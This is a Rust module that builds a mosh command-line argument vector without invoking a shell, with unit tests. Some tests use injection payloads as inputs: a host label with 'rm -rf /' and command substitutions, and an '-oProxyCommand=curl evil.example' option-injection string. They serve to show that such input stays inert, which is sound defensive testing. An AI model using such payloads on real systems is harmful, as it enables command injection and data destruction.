//! Building the `mosh` argument vector.
//!
//! The whole vector is handed to `exec` element by element, never to a shell,
//! so a host label full of shell metacharacters is one inert argument. The one
//! mosh-side exception is `--ssh=`: upstream `scripts/mosh.pl` passes that value
//! through `Text::ParseWords::shellwords` itself and then runs the resulting
//! `@ssh` argv directly (no shell), so the value is a command *line* by mosh's
//! design, not by ours. A host label never goes into it.

use crate::MoshError;

/// How to launch `mosh` against one host.
///
/// `--ssh` semantics, from `man mosh`: it is the "OpenSSH command to remotely
/// execute mosh-server on remote machine (default: ssh)", and the manual's own
/// example of a non-default port is `--ssh="ssh -p 2222"`. mosh appends
/// `-n -tt <target> -- <remote command>` to that command, so whatever is
/// supplied must behave like `ssh`. mosh's own `-p` is the *UDP* server port
/// and deliberately does not affect the SSH port.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MoshInvocation {
    host: String,
    user: Option<String>,
    port: Option<u16>,
    ssh: Option<String>,
    ssh_port: Option<u16>,
    command: Vec<String>,
    env: Vec<(String, String)>,
}

impl MoshInvocation {
    /// An invocation against `host` (`[user@]host` is also accepted; use
    /// [`Self::user`] for the split form).
    pub fn new(host: impl Into<String>) -> Self {
        Self {
            host: host.into(),
            user: None,
            port: None,
            ssh: None,
            ssh_port: None,
            command: Vec::new(),
            env: Vec::new(),
        }
    }

    /// Log in as `user`, folded into the target as `user@host`.
    #[must_use]
    pub fn user(mut self, user: impl Into<String>) -> Self {
        self.user = Some(user.into());
        self
    }

    /// The server-side UDP port (`mosh -p PORT`), for a firewall that only
    /// forwards one port. Does not change the SSH port — use
    /// [`Self::ssh_port`] or [`Self::ssh_command`] for that.
    ///
    /// `ponytail:` a single port, not mosh's `-p LOW:HIGH` range; add a range
    /// accessor if a deployment ever needs one.
    #[must_use]
    pub fn port(mut self, port: u16) -> Self {
        self.port = Some(port);
        self
    }

    /// The ssh-compatible command mosh runs to start `mosh-server` remotely,
    /// replacing the default `ssh`. Point it at our own transport when one
    /// exists, e.g. `"sshdeck-ssh-bridge --connection 7"`.
    #[must_use]
    pub fn ssh_command(mut self, command: impl Into<String>) -> Self {
        self.ssh = Some(command.into());
        self
    }

    /// Port for the *default* `ssh` command, folded in as `ssh -p PORT` (the
    /// manual's documented form). Ignored when [`Self::ssh_command`] set one.
    #[must_use]
    pub fn ssh_port(mut self, port: u16) -> Self {
        self.ssh_port = Some(port);
        self
    }

    /// The command to run on the remote host instead of a login shell.
    #[must_use]
    pub fn command<I, S>(mut self, args: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: Into<String>,
    {
        self.command = args.into_iter().map(Into::into).collect();
        self
    }

    /// Extra environment for the child; the rest is inherited. A GUI app must
    /// set at least `TERM` (and a UTF-8 locale): `mosh-client` refuses to start
    /// without a usable terminfo entry.
    #[must_use]
    pub fn env(mut self, key: impl Into<String>, value: impl Into<String>) -> Self {
        self.env.push((key.into(), value.into()));
        self
    }

    /// The `--ssh=` value: the explicit command, else `ssh` with any
    /// [`Self::ssh_port`], else `ssh`.
    pub fn ssh(&self) -> String {
        match (&self.ssh, self.ssh_port) {
            (Some(command), _) => command.clone(),
            (None, Some(port)) => format!("ssh -p {port}"),
            (None, None) => "ssh".to_string(),
        }
    }

    /// The `[user@]host` target.
    pub fn target(&self) -> String {
        match &self.user {
            Some(user) => format!("{user}@{}", self.host),
            None => self.host.clone(),
        }
    }

    /// Extra environment pairs for the child.
    pub fn environment(&self) -> impl Iterator<Item = (&str, &str)> {
        self.env
            .iter()
            .map(|(key, value)| (key.as_str(), value.as_str()))
    }

    /// The full argument vector for the `mosh` binary, ready to show in a UI
    /// before running it. Nothing here is split, quoted, or shell-interpreted:
    /// these are the exact elements passed to `exec`.
    pub fn argv(&self) -> Vec<String> {
        let mut argv = Vec::with_capacity(6 + self.command.len());
        argv.push(format!("--ssh={}", self.ssh()));
        if let Some(port) = self.port {
            argv.push("-p".to_string());
            argv.push(port.to_string());
        }
        // `--` stops mosh's own Getopt::Long parsing, so a target or command
        // that starts with `-` is still a target or command.
        argv.push("--".to_string());
        argv.push(self.target());
        argv.extend(self.command.iter().cloned());
        argv
    }

    /// Rejects invocations that must never reach `exec`.
    pub fn validate(&self) -> Result<(), MoshError> {
        if self.host.trim().is_empty() {
            return Err(MoshError::Invalid("the host is empty".to_string()));
        }
        if self.host.contains('\0') {
            return Err(MoshError::Invalid(
                "the host contains a NUL byte".to_string(),
            ));
        }
        if let Some(user) = &self.user {
            if user.trim().is_empty() {
                return Err(MoshError::Invalid("the user is empty".to_string()));
            }
            if user.contains('\0') {
                return Err(MoshError::Invalid(
                    "the user contains a NUL byte".to_string(),
                ));
            }
            if self.host.contains('@') {
                return Err(MoshError::Invalid(format!(
                    "the host {:?} already contains `@`; pass either a user or a `user@host` target, not both",
                    self.host
                )));
            }
        }
        if self.command.iter().any(|arg| arg.contains('\0')) {
            return Err(MoshError::Invalid(
                "the remote command contains a NUL byte".to_string(),
            ));
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_plain_host() {
        assert_eq!(
            MoshInvocation::new("example.com").argv(),
            ["--ssh=ssh", "--", "example.com"]
        );
    }

    #[test]
    fn a_host_with_a_non_default_port() {
        // `-p` is mosh's UDP port; the SSH port rides inside `--ssh`.
        assert_eq!(
            MoshInvocation::new("example.com")
                .port(60001)
                .ssh_port(2222)
                .argv(),
            ["--ssh=ssh -p 2222", "-p", "60001", "--", "example.com"]
        );
    }

    #[test]
    fn a_host_with_a_user() {
        let invocation = MoshInvocation::new("example.com").user("alice");
        assert_eq!(invocation.target(), "alice@example.com");
        assert_eq!(invocation.argv(), ["--ssh=ssh", "--", "alice@example.com"]);
    }

    #[test]
    fn a_custom_ssh_command_replaces_the_default() {
        let invocation =
            MoshInvocation::new("example.com").ssh_command("sshdeck-bridge --connection 7");
        assert_eq!(
            invocation.argv(),
            ["--ssh=sshdeck-bridge --connection 7", "--", "example.com"]
        );
    }

    #[test]
    fn a_remote_command_follows_the_target_as_separate_elements() {
        let invocation = MoshInvocation::new("example.com").command(["tmux", "new", "-A"]);
        assert_eq!(
            invocation.argv(),
            ["--ssh=ssh", "--", "example.com", "tmux", "new", "-A"]
        );
    }

    #[test]
    fn shell_metacharacters_in_the_host_stay_one_inert_element() {
        let host = "evil; rm -rf / #$(id)`whoami` \"quoted house\"";
        let invocation = MoshInvocation::new(host).user("bob");
        let argv = invocation.argv();

        // Exactly one element is the target, and it is byte-for-byte the label:
        // nothing stripped, nothing quoted, nothing concatenated.
        let target = format!("bob@{host}");
        assert_eq!(argv.last().map(String::as_str), Some(target.as_str()));
        assert_eq!(
            argv.iter().filter(|arg| arg.contains("rm -rf")).count(),
            1,
            "the payload must not be copied into another element: {argv:?}"
        );
        // The `--ssh` value is ours, not the caller's label.
        assert_eq!(argv.first().map(String::as_str), Some("--ssh=ssh"));
    }

    #[test]
    fn a_host_that_looks_like_an_option_is_still_a_target() {
        // Without the `--` mosh's Getopt::Long would eat this.
        let invocation = MoshInvocation::new("-oProxyCommand=curl evil.example");
        assert_eq!(
            invocation.argv(),
            ["--ssh=ssh", "--", "-oProxyCommand=curl evil.example"]
        );
    }

    #[test]
    fn extra_environment_is_carried_for_the_spawn_only() {
        let invocation = MoshInvocation::new("example.com")
            .env("TERM", "xterm-256color")
            .env("LANG", "en_US.UTF-8");
        assert_eq!(
            invocation.environment().collect::<Vec<_>>(),
            [("TERM", "xterm-256color"), ("LANG", "en_US.UTF-8")]
        );
        // The env never leaks into argv.
        assert!(!invocation.argv().iter().any(|arg| arg.contains("TERM")));
    }

    #[test]
    fn validate_rejects_an_empty_host_and_a_double_user() {
        assert!(matches!(
            MoshInvocation::new("   ").validate(),
            Err(MoshError::Invalid(_))
        ));
        assert!(matches!(
            MoshInvocation::new("alice@example.com")
                .user("bob")
                .validate(),
            Err(MoshError::Invalid(_))
        ));
        assert!(MoshInvocation::new("example.com")
            .user("")
            .validate()
            .is_err());
        // `user@host` without a separate user is fine.
        assert!(MoshInvocation::new("alice@example.com").validate().is_ok());
        assert!(MoshInvocation::new("example.com")
            .user("bob")
            .validate()
            .is_ok());
    }
}
